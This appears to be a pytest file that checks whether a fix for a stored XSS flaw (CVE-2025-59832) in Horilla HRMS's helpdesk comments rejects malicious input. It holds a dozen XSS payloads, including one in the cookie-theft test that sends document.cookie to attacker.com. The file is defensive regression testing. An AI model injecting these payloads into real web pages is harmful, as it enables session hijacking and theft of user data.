"""
Vulnerability tests for CVE-2025-59832 (Stored XSS in Horilla HRMS).

These tests verify that XSS payloads are properly detected and blocked.
- FAIL in vulnerable state (XSS payloads bypass validation - no XSS-related ValidationError)
- PASS in fixed state (XSS payloads are detected and blocked - XSS-specific ValidationError raised)

The tests check that when XSS content is submitted, a ValidationError containing
"XSS" is raised. In vulnerable versions, this check doesn't exist, so no XSS error is raised.
"""
import pytest
import os
import sys


@pytest.fixture(scope="module", autouse=True)
def setup_django():
    """Setup Django environment once for all tests."""
    sys.path.insert(0, '/app')
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'horilla.settings')
    import django
    django.setup()


def assert_xss_blocked(comment_text):
    """
    Assert that XSS content is blocked when trying to save a Comment.

    In fixed version: ValidationError with 'XSS' message is raised -> assertion passes
    In vulnerable version: No XSS validation -> assertion fails
    """
    from django.core.exceptions import ValidationError
    from helpdesk.models import Comment

    comment = Comment(comment=comment_text)

    try:
        # Only clean the 'comment' field, not required foreign keys
        comment.clean_fields(exclude=['ticket', 'employee_id'])
        # If we get here without error, XSS was not blocked
        pytest.fail(f"XSS payload was NOT blocked: {comment_text[:50]}...")
    except ValidationError as e:
        # Check if the error is specifically about XSS
        error_str = str(e)
        if 'XSS' not in error_str and 'xss' not in error_str.lower():
            pytest.fail(f"ValidationError raised but not for XSS: {error_str}")
        # If we get here, XSS was properly blocked


class TestXSSScriptTagBlocked:
    """Test that script tag based XSS payloads are blocked at model level."""

    def test_basic_script_tag_blocked(self):
        """Test that basic script tag is blocked when saving Comment."""
        assert_xss_blocked("<script>alert('XSS')</script>")

    def test_uppercase_script_tag_blocked(self):
        """Test that uppercase SCRIPT tag is blocked."""
        assert_xss_blocked("<SCRIPT>alert('XSS')</SCRIPT>")

    def test_mixed_case_script_tag_blocked(self):
        """Test that mixed case script tag is blocked."""
        assert_xss_blocked("<ScRiPt>alert('XSS')</ScRiPt>")

    def test_script_tag_with_spaces_blocked(self):
        """Test that script tag with extra spaces is blocked."""
        assert_xss_blocked("<script >alert('XSS')</script >")

    def test_cookie_theft_payload_blocked(self):
        """Test that cookie theft payload is blocked."""
        assert_xss_blocked("<script>new Image().src='http://attacker.com/?c='+document.cookie</script>")


class TestXSSEventHandlerBlocked:
    """Test that event handler based XSS payloads are blocked."""

    def test_img_onerror_blocked(self):
        """Test that img onerror handler is blocked."""
        assert_xss_blocked('<img src=x onerror="alert(\'XSS\')">')

    def test_svg_onload_blocked(self):
        """Test that svg onload handler is blocked."""
        assert_xss_blocked('<svg onload="alert(\'XSS\')">')

    def test_body_onload_blocked(self):
        """Test that body onload handler is blocked."""
        assert_xss_blocked('<body onload="alert(\'XSS\')">')

    def test_div_onclick_blocked(self):
        """Test that div onclick handler is blocked."""
        assert_xss_blocked('<div onclick="alert(\'XSS\')">Click me</div>')


class TestXSSJavascriptProtocolBlocked:
    """Test that javascript: protocol based XSS payloads are blocked."""

    def test_javascript_protocol_blocked(self):
        """Test that javascript: protocol is blocked."""
        assert_xss_blocked("javascript:alert('XSS')")

    def test_javascript_protocol_uppercase_blocked(self):
        """Test that JAVASCRIPT: protocol is blocked."""
        assert_xss_blocked("JAVASCRIPT:alert('XSS')")

    def test_link_href_javascript_blocked(self):
        """Test that href with javascript: is blocked."""
        assert_xss_blocked('<a href="javascript:alert(\'XSS\')">Click</a>')
